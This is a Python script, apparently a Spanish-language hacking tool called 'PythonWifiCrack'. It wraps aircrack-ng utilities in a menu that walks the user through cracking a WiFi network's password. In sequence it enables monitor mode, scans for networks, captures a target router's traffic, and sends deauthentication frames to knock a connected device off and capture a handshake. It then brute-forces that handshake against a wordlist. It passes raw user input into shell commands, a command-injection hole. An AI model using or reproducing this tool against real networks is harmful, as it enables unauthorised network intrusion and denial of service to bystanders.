import os

print("PythonWifiCrack")
print("Author: Marco Argueta")
print("https://www.hackingelsalvador.com")

print("Recuerda ejecutarme en modo root")

print("Selecciona la opcion que deseas realizar")

def inicio():
	seguir = True
	while seguir:
		print('''
1) Ver tarjetas de red.
2) Escanear redes inalambricas.
3) Seleccionar red a crackear.
4) Capturar handshake.
5) Utilizar diccionario.
6) Relavantar servicios
99) Salir.
		''')
		
		opcion = input("Seleccione opcion: ")

		while opcion == "1":
			print("Tarjetas disponibles")
			os.system("ifconfig")
			tarjeta = input("Escriba el nombre de la tarjeta de red a poner en modo monitor: ")
			#Aqui debe ir el comando de aircrack check kill y modo monitor
			os.system("airmon-ng check kill")
			os.system("airmon-ng start " + tarjeta)

			print("Modo monitor activado")

			opcion = input("Escriba 2 para comenzar a escanear redes WiFi: ")

		while opcion == "2":
			print("ESCANEANDO REDES WIFI")
			os.system("airodump-ng " + tarjeta + "mon")

			opcion = input("Escriba 3 para continuar: ")

		while opcion == "3":
			canal = input("Escriba el numero de canal: ")
			capture = input("Escriba la ubicacion donde se guardara el capture: ")
			ssid = input("Escriba la mac del router: ")

			os.system("airodump-ng -c " + canal + "	-w " + capture + "capture --bssid " + ssid + " " + tarjeta + "mon")

			opcion = input("Escriba 6 para continuar: ")

		while opcion == "4":
			ssid = input("Escriba la mac del router: ")
			conectado = input("Escriba la mac del dispotivo conectado: ")
			tarjeta = input("Escriba el nombre de la tarjeta WiFi: ")
			# canal = input("Escriba el numero de canal: ")

			os.system("aireplay-ng -0 5 -a " + ssid + " -c " + conectado + " " + tarjeta)
			
			opcion4 = input("Escriba si para ir atras: ")
			if opcion4 == "si":
				inicio()

		while opcion == "5":
			diccionario = input("Escriba la ubicacion del diccionario: ")
			capture = input("Escriba la ubicacion del capture-01.cap: ")

			os.system("aircrack-ng -w " + diccionario + " " + capture)
			
			opcion5 = input("Escriba si para ir atras: ")
			if opcion5 == "si":
				inicio()

		while opcion == "6":
			print("Levantando servicios")

			os.system("airmon-ng stop " + tarjeta + "mon")
			print("WiFi levantado")

			os.system("service network-manager start")
			print("Servicio de red levantado")

			opcion6 = input("Escriba si para ir atras: ")
			if opcion6 == "si":
				inicio()

		if opcion == "99":
			seguir = False

inicio()